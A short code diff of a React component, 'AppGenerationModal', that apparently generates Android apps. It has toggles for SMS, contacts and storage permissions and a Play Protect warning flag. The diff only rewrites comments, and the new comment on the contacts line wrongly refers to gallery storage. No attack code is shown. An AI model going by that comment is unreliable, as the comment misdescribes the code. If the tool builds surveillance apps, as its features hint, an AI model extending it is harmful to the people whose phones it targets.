@@ -24,8 +24,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
 
     // Permission Manager State
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
-    const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Default OFF
-    const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery - Default ON
+    const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Gallery/Storage is usually needed
+    const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | null>(null);
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
